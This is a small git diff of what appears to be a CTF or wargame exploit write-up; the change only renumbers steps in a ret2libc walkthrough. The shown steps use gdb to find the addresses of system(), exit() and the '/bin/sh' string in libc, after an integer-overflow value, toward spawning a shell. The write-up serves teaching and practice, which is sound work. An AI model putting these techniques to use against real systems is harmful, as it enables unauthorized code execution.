@@ -88,19 +88,19 @@ unsigned int overflowVal = (std::pow(2, 32) / 4) + 114; -> 1073741938
 ```
 
 
-3. Retrieve the **`system()`** address :
+2. Retrieve the **`system()`** address :
 ```c
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
 ```
 
-4. Retrieve **`exit()`** address :
+3. Retrieve **`exit()`** address :
 ```c
 (gdb) p exit
 $1 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
 ```
 
-5. Find **`"/bin/sh"`** string address in libc-2.15.so using **`find`** command :
+4. Find **`"/bin/sh"`** string address in libc-2.15.so using **`find`** command :
 ```
 (gdb) info proc map
 process 1857
